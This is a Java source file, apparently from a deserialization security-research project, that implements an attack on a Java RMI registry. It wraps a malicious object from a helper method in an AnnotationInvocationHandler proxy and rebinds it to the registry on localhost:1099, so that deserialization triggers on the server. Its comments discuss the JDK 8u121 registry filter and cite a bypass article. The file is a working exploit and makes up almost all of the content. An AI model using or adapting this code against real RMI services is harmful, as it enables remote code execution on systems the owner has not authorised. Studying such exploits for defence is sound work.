package org.su18.serialize.rmi.client.exploit;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;

import static org.su18.serialize.rmi.client.exploit.RMIClientExploitServer.getEvilClass;

/**
 * 攻击 Registry
 * <p>
 * [java 8 update 121]之后RMIRegistryImpl.registryFilter() 的限制
 * http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5534221c23fc/src/share/classes/sun/rmi/registry/RegistryImpl.java#l388
 * 会导致在 ObjectInputStream readNonProxyDesc 中 filterCheck 时抛出异常
 * <p>
 * 可以看 bsmali4 师傅的文章
 * http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/
 * 使用 RemoteObjectInvocationHandler/RMIConnectionImpl_Stub
 *
 * @author su18
 */
public class RMIClientExploitRegistry {


	public static void main(String[] args) throws Exception {

		// 连接 Registry
		Registry registry = LocateRegistry.getRegistry("localhost", 1099);

		// 使用 AnnotationInvocationHandler 动态代理 Remote
		Class<?>       c           = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor<?> constructor = c.getDeclaredConstructors()[0];
		constructor.setAccessible(true);

		HashMap<String, Object> map = new HashMap<>();
		map.put("su18", getEvilClass());

		// 使用动态代理初始化 AnnotationInvocationHandler
		InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);

		// 使用 AnnotationInvocationHandler 动态代理 Remote
		Remote remote = (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
				new Class[]{Remote.class}, invocationHandler);

		// bind 到 Registry 时会触发反序列化
		registry.rebind("su18", remote);
	}

}
